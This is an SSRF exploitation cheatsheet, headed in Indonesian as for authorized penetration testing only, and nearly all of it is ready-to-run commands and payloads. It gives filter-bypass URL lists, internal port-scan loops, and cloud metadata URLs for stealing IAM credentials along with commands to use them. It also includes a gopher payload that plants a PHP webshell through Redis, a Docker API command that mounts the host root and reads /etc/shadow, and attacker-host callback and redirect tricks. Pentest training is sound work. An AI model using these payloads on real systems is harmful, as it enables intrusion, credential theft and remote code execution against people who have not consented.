# 🌐 SSRF DEEP DIVE — Full Exploitation Cheatsheet

## OWASP A10:2021 / A01:2025 — Server-Side Request Forgery

> ⚠️ **Hanya untuk penetration testing yang sudah diotorisasi.**

---

## 📑 Table of Contents
1. [SSRF Fundamentals](#1-ssrf-fundamentals)
2. [Step 1: Finding SSRF Entry Points](#2-finding-ssrf-entry-points)
3. [Step 2: Confirming SSRF](#3-confirming-ssrf)
4. [Step 3: Bypass Filters](#4-bypass-filters)
5. [Step 4: Internal Port Scanning](#5-internal-port-scanning)
6. [Step 5: Cloud Metadata Exploitation](#6-cloud-metadata-exploitation)
7. [Step 6: Internal Service Exploitation](#7-internal-service-exploitation)
8. [Step 7: SSRF to RCE](#8-ssrf-to-rce)
9. [Blind SSRF Techniques](#9-blind-ssrf-techniques)
10. [Tools & Automation](#10-tools--automation)

---

# 1. SSRF Fundamentals

```
SSRF Attack Flow:
┌──────────┐    1. Malicious URL     ┌──────────┐    2. Server makes    ┌──────────────┐
│ Attacker │ ──────────────────────► │  Target  │ ──────────────────►   │ Internal     │
│          │                         │  Server  │    request to         │ Service/     │
│          │ ◄────────────────────── │          │ ◄──────────────────   │ Cloud Meta   │
└──────────┘    4. Data returned     └──────────┘    3. Response        └──────────────┘

Types:
- Basic SSRF: Response returned to attacker
- Blind SSRF: No response, but side effects (timing, DNS, OOB)
- Semi-Blind: Partial info (status code, error messages)
```

---

# 2. Finding SSRF Entry Points

```bash
# ===== COMMON VULNERABLE PARAMETERS =====
?url=
?uri=
?path=
?dest=
?redirect=
?link=
?src=
?source=
?imageURL=
?iconURL=
?img=
?image=
?feed=
?to=
?out=
?ref=
?site=
?html=
?data=
?load=
?page=
?content=
?document=
?folder=
?target=
?proxy=
?navigate=
?open=
?callback=
?return=
?next=
?domain=
?host=
?port=

# ===== COMMON VULNERABLE FEATURES =====
# 1. PDF/Document generators (wkhtmltopdf, puppeteer)
#    → <iframe src="http://127.0.0.1">
# 2. Image fetchers / avatar upload via URL
#    → Upload from URL: http://127.0.0.1
# 3. Webhook configurations
#    → Callback URL: http://127.0.0.1
# 4. File import (CSV, XML, JSON from URL)
# 5. Link previews / unfurlers (Slack-like)
# 6. Translation services
# 7. Map/geo services
# 8. RSS/Atom feed readers
# 9. HTML/URL to screenshot services
# 10. Proxy/relay services

# ===== DETECTION WITH GF =====
cat urls.txt | gf ssrf > ssrf_targets.txt

# ===== NUCLEI =====
nuclei -l urls.txt -tags ssrf -o ssrf_results.txt
```

---

# 3. Confirming SSRF

```bash
# ===== STEP-BY-STEP CONFIRMATION =====

# Step 1: Setup callback server
# Option A: Burp Collaborator
# Option B: interactsh
interactsh-client
# Gives you: abc123.oast.fun

# Option C: webhook.site
# Option D: Your own server
python3 -m http.server 8888

# Step 2: Send SSRF payload with callback
curl "https://target.com/fetch?url=http://abc123.oast.fun"
curl "https://target.com/fetch?url=http://YOUR_SERVER:8888/ssrf-test"

# Step 3: Check callback — did target server make the request?
# If YES → SSRF confirmed!
# Check: User-Agent, IP address of incoming request

# Step 4: Test internal access
curl "https://target.com/fetch?url=http://127.0.0.1"
curl "https://target.com/fetch?url=http://localhost"

# Step 5: Compare responses
# External URL → 200 + content
# Internal URL → different response / error = partial SSRF
# Internal URL → content returned = full SSRF
```

---

# 4. Bypass Filters

```bash
# ===== LOCALHOST ALTERNATIVES =====
http://127.0.0.1
http://localhost
http://127.1
http://127.0.1
http://0.0.0.0
http://0
http://[::1]                     # IPv6
http://[0000::1]
http://[::ffff:127.0.0.1]       # IPv6 mapped
http://[0:0:0:0:0:ffff:127.0.0.1]
http://2130706433               # Decimal
http://0x7f000001               # Hex
http://0x7f.0x0.0x0.0x1         # Hex dotted
http://0177.0.0.1               # Octal
http://0177.0.1                 # Short octal
http://①②⑦.⓪.⓪.①              # Unicode
http://127.0.0.1.nip.io         # DNS wildcard
http://localtest.me             # Resolves to 127.0.0.1
http://spoofed.burpcollaborator.net  # DNS rebinding

# ===== URL PARSING TRICKS =====
# @ symbol (userinfo)
http://evil.com@127.0.0.1          # Goes to 127.0.0.1
http://127.0.0.1@evil.com          # Depends on parser
http://evil.com%40127.0.0.1

# Fragment
http://127.0.0.1#@evil.com
http://evil.com#@127.0.0.1

# Backslash
http://127.0.0.1\@evil.com

# Encoded
http://%31%32%37%2e%30%2e%30%2e%31  # 127.0.0.1 URL encoded
http://127.0.0.1%00@evil.com        # Null byte
http://127.0.0.1%2523@evil.com      # Double encode #

# ===== PROTOCOL BYPASS =====
# If http blocked, try:
gopher://127.0.0.1:6379/_
dict://127.0.0.1:6379/INFO
file:///etc/passwd
ftp://127.0.0.1
sftp://127.0.0.1
ldap://127.0.0.1
tftp://127.0.0.1

# ===== REDIRECT BYPASS =====
# If server follows redirects:
# 1. Host redirect on your server
# your-server.com/redir → 302 → http://127.0.0.1
curl "https://target.com/fetch?url=http://your-server.com/redir"

# Python redirect server:
# from http.server import HTTPServer, BaseHTTPRequestHandler
# class Handler(BaseHTTPRequestHandler):
#     def do_GET(self):
#         self.send_response(302)
#         self.send_header('Location', 'http://127.0.0.1/admin')
#         self.end_headers()

# 2. URL shortener
# tinyurl.com → 127.0.0.1

# 3. DNS rebinding
# First request: evil.com → ATTACKER_IP (passes filter)
# Second request: evil.com → 127.0.0.1 (after TTL expires)
# Tool: singularity (https://github.com/nccgroup/singularity)

# ===== ALLOWLIST/DENYLIST BYPASS =====
# If "target.com" is allowed:
http://target.com.evil.com          # Subdomain of evil
http://evil-target.com              # Similar domain
http://target.com@evil.com          # Userinfo trick
http://evil.com/target.com          # Path confusion

# If IP range blocked:
# Use alternate IP representations (decimal, hex, octal)
# Use DNS that resolves to internal IP
# Use IPv6 mapped addresses

# ===== HEADER INJECTION IN URL =====
http://127.0.0.1/%0d%0aHost:%20evil.com
http://127.0.0.1/%0d%0a%0d%0aINJECTED_BODY
```

---

# 5. Internal Port Scanning

```bash
# ===== SCAN INTERNAL PORTS VIA SSRF =====

# Step 1: Check common ports
for port in 21 22 23 25 80 110 135 139 443 445 993 995 1433 1521 2049 3306 3389 5432 5900 5985 6379 8080 8443 9200 9300 11211 27017; do
  echo "Testing port $port"
  curl -s -o /dev/null -w "%{http_code} %{time_total}" \
    "https://target.com/fetch?url=http://127.0.0.1:$port"
done

# Step 2: Detect by response
# Open port: different response (200, content, larger body)
# Closed port: error, timeout, smaller body

# Step 3: Scan internal network
# 10.0.0.0/8
# 172.16.0.0/12
# 192.168.0.0/16
for ip in $(seq 1 255); do
  curl -s -o /dev/null -w "192.168.1.$ip: %{http_code}\n" \
    "https://target.com/fetch?url=http://192.168.1.$ip"
done

# Common internal services to find:
# :22    SSH
# :80    HTTP
# :443   HTTPS
# :3306  MySQL
# :5432  PostgreSQL
# :6379  Redis
# :9200  Elasticsearch
# :8080  Tomcat/Jenkins
# :8500  Consul
# :2375  Docker API
# :27017 MongoDB
# :11211 Memcached
# :9090  Prometheus
# :3000  Grafana
# :8888  Jupyter Notebook
```

---

# 6. Cloud Metadata Exploitation

```bash
# ===== AWS EC2 (IMDSv1) =====
# Step 1: Get instance info
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# Step 2: Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Step 3: Get IAM credentials (CRITICAL!)
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 4: Use stolen AWS credentials
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=SECRET...
export AWS_SESSION_TOKEN=TOKEN...
aws s3 ls                    # List buckets
aws iam get-user             # Who am I?
aws ec2 describe-instances   # List all EC2

# Step 5: Get user-data (may contain secrets)
http://169.254.169.254/latest/user-data/
# Often has: passwords, API keys, bootstrap scripts

# ===== AWS IMDSv2 (harder — needs PUT with header) =====
# Requires 2 requests — harder to SSRF but possible via gopher
# Step 1: Get token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2: Use token
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN

# ===== GCP =====
http://metadata.google.internal/computeMetadata/v1/
# Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/zone

# ===== AZURE =====
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# ===== DIGITALOCEAN =====
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname

# ===== KUBERNETES =====
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/pods
# Token: /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

# 7. Internal Service Exploitation

```bash
# ===== REDIS (port 6379) =====
# Via gopher protocol → write webshell
# Step 1: Generate gopher payload
python gopherus.py --exploit redis
# Step 2: Send via SSRF
curl "https://target.com/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B'cmd'%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0A"
# Step 3: Access webshell
curl "https://target.com/shell.php?cmd=id"

# ===== MYSQL (port 3306) =====
python gopherus.py --exploit mysql
# Enter: username (root), query (SHOW DATABASES;)
# Send gopher payload via SSRF

# ===== FASTCGI (port 9000) =====
python gopherus.py --exploit fastcgi
# Enter: command to execute
# Send via SSRF → PHP-FPM executes command

# ===== SMTP (port 25) =====
python gopherus.py --exploit smtp
# Send email via internal SMTP

# ===== DOCKER API (port 2375) =====
# List containers
http://127.0.0.1:2375/containers/json
# Create container with host mount
http://127.0.0.1:2375/containers/create
# → mount host filesystem → RCE

# ===== ELASTICSEARCH (port 9200) =====
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=password
http://127.0.0.1:9200/_all/_search?q=*

# ===== CONSUL (port 8500) =====
http://127.0.0.1:8500/v1/agent/self
http://127.0.0.1:8500/v1/kv/?recurse
# May contain secrets, API keys

# ===== KUBERNETES API (port 6443/8443) =====
https://127.0.0.1:6443/api/v1/namespaces
https://127.0.0.1:6443/api/v1/secrets

# ===== JENKINS (port 8080) =====
http://127.0.0.1:8080/script  # Groovy console → RCE
# def cmd = "id".execute(); println cmd.text

# ===== MEMCACHED (port 11211) =====
# Via gopher
gopher://127.0.0.1:11211/_stats%0D%0A
gopher://127.0.0.1:11211/_get%20session:admin%0D%0A
```

---

# 8. SSRF to RCE

```bash
# ===== PATH 1: Redis → Webshell =====
# (See Redis section above)

# ===== PATH 2: FastCGI → PHP Code Execution =====
# Gopherus payload → PHP-FPM → system('id')

# ===== PATH 3: Docker API → Container Escape =====
# Step 1: Create container mounting host root
curl -X POST "http://127.0.0.1:2375/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"Binds":["/:/host"]}'
# Step 2: Start container
curl -X POST "http://127.0.0.1:2375/containers/CONTAINER_ID/start"
# Step 3: Read output → host filesystem access

# ===== PATH 4: Cloud Credentials → Full Takeover =====
# Step 1: Steal IAM credentials via metadata
# Step 2: Use AWS CLI with stolen creds
# Step 3: Access S3, EC2, Lambda → RCE on cloud

# ===== PATH 5: Jenkins Script Console → RCE =====
# Step 1: SSRF to http://127.0.0.1:8080/script
# Step 2: Execute Groovy: "whoami".execute().text

# ===== PATH 6: Kubernetes API → Pod Creation =====
# Step 1: SSRF to K8s API
# Step 2: Create pod with hostPID/hostNetwork
# Step 3: nsenter into host → full node access

# ===== PATH 7: XXE → SSRF → RCE Chain =====
# Step 1: XXE to read internal files
# Step 2: XXE to SSRF internal services
# Step 3: SSRF to Redis/FastCGI → RCE
```

---

# 9. Blind SSRF Techniques

```bash
# ===== WHEN NO RESPONSE IS RETURNED =====

# Method 1: Timing-based
# Open port: fast response (connection accepted)
# Closed port: slow response (timeout)
time curl "https://target.com/fetch?url=http://127.0.0.1:22"    # ~0.1s = open
time curl "https://target.com/fetch?url=http://127.0.0.1:12345" # ~10s = closed

# Method 2: DNS-based (OOB)
# Use unique subdomain per test
curl "https://target.com/fetch?url=http://port22.abc.oast.fun"
curl "https://target.com/fetch?url=http://port3306.abc.oast.fun"
# Check DNS logs → which resolved = server made request

# Method 3: HTTP callback
# interactsh / Burp Collaborator
curl "https://target.com/fetch?url=http://abc123.oast.fun/ssrf"
# Check for incoming HTTP request

# Method 4: Error-based
# Different error messages for:
# - Connection refused (port closed but host up)
# - Connection timeout (host down or filtered)
# - Connection reset (port open, wrong protocol)
# → Map internal network from error differences

# Method 5: Response size/status difference
# Even without body, check:
# - HTTP status code differences
# - Content-Length differences
# - Response time differences
```

---

# 10. Tools & Automation

```bash
# ===== SSRFmap =====
git clone https://github.com/swisskyrepo/SSRFmap.git
pip install -r requirements.txt

# Basic
python ssrfmap.py -r request.txt -p url -m portscan
python ssrfmap.py -r request.txt -p url -m readfiles
python ssrfmap.py -r request.txt -p url -m aws
python ssrfmap.py -r request.txt -p url -m gce
python ssrfmap.py -r request.txt -p url -m redis

# ===== Gopherus =====
git clone https://github.com/tarunkant/Gopherus.git
python gopherus.py --exploit redis
python gopherus.py --exploit mysql
python gopherus.py --exploit fastcgi
python gopherus.py --exploit smtp
python gopherus.py --exploit zabbix
python gopherus.py --exploit memcache

# ===== singularity (DNS rebinding) =====
git clone https://github.com/nccgroup/singularity.git
# Setup DNS rebinding attack to bypass SSRF filters

# ===== Nuclei =====
nuclei -u https://target.com -tags ssrf
nuclei -l urls.txt -tags ssrf -o ssrf_vulns.txt

# ===== Interactsh (OOB callback) =====
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# Use generated domain in SSRF payloads

# ===== FULL PIPELINE =====
# 1. Collect URLs
echo "target.com" | gau | grep "=" | sort -u > params.txt

# 2. Filter for SSRF params
cat params.txt | gf ssrf > ssrf_candidates.txt

# 3. Test with Nuclei
nuclei -l ssrf_candidates.txt -tags ssrf

# 4. Manual verification with Burp/interactsh
# 5. Escalate: metadata → credentials → RCE
```

---

> ⚠️ **DISCLAIMER**: Semua teknik hanya untuk **ethical hacking** dan **pentesting yang sudah diotorisasi**.
